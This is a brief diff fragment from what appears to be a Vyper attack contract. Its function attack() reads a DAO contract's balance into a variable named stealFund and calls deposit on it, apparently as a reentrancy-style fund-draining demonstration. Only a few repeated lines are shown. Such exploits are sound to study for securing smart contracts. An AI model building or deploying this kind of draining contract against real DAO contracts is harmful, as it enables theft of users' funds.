@@ -46,11 +46,9 @@ def attack(dao_address:address):
     DAO(self.owner_address).deposit(value = stealFund)
     DAO(msg.sender).deposit(value = stealFund)
     
-    stealFund: uint256 = DAO(self.dao_address).userBalances(self.dao_address)
     DAO(self.owner_address).deposit(value = stealFund)
     DAO(msg.sender).deposit(value = stealFund)
     
-    stealFund: uint256 = DAO(self.dao_address).userBalances(self.dao_address)
     DAO(self.owner_address).deposit(value = stealFund)
     DAO(msg.sender).deposit(value = stealFund)
     
